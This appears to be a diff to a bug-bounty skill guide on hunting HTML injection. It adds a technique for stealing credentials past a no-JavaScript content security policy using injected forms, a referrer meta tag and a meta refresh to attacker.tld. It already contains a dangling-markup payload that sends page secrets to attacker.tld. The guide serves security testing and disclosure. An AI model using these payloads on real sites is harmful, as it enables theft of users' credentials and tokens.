@@ -2,7 +2,7 @@
 name: hunt-html-injection
 description: "Hunt HTML Injection — user-supplied input is rendered as raw HTML in the response without sanitisation, allowing an attacker to inject arbitrary HTML tags (but not necessarily JavaScript). Lower severity than XSS but enables phishing, UI manipulation, and credential harvesting via injected forms. Use when testing text-display surfaces (search results, profile fields, comments, error messages, feedback forms). For markup that executes JavaScript, escalate to hunt-xss."
 sources: hackerone_public, public_research
-report_count: 6
+report_count: 7
 ---
 
 ## What is HTML Injection
@@ -19,6 +19,7 @@ HTML Injection occurs when user input is inserted into a page's HTML without esc
 - Stepping stone to XSS (may be blocked by WAF on `<script>` but not `<img onerror>`)
 - **Dangling-markup exfiltration** — even with `<script>` and event handlers filtered, an *unterminated* tag can capture page content that follows it. Inject `<img src='//attacker.tld/log?html=` (no closing quote/`>`); the browser treats everything up to the next `'` as the URL, leaking any CSRF token, secret, or PII rendered after your injection point to your server. Works where full XSS is blocked but raw `<` is reflected.
 - **Email/notification-context injection** — a field reflected unescaped into a transactional email (signup confirmation, admin alert, support-chat transcript) renders injected `<a>`/`<img>`/dangling markup in the *recipient's* inbox — an audience the web UI can't reach, and often the only place HTML is rendered unfiltered. Inject into name/subject/comment, then read the raw email source. Disclosed class: <https://hackerone.com/reports/1935628>, <https://hackerone.com/reports/3556892>.
+- **Credential theft under a "no-JS" CSP** — before writing off a reflected injection because `script-src`/`default-src 'none'` blocks execution, check `form-action` specifically: it does **not** inherit from `default-src`, so a policy that omits it (or sets `form-action 'self'`) still lets an injected `<form>` with no `action` attribute submit back to the *same* page via GET, putting any pre-filled credentials/tokens into the query string. Pair it with a second payload stashed in a `<textarea name="<the-vulnerable-param>">` inside that form — it rides along in the resubmitted query string, and on the next page load the *same* reflection renders it as live markup. Use that second-stage render to set `<meta name="referrer" content="unsafe-url">` followed by `<meta http-equiv="refresh" content="0;url=https://attacker.tld/log">`; the resulting navigation sends the full URL (including the harvested credentials) to the attacker in the `Referer` header — no script execution anywhere in the chain. Source: PortSwigger Research, "Blind trust: stealing credentials through CSP" (2026-11-11), <https://portswigger.net/research/blind-trust-stealing-credentials-through-csp>.
 
 ## Attack Surface
 
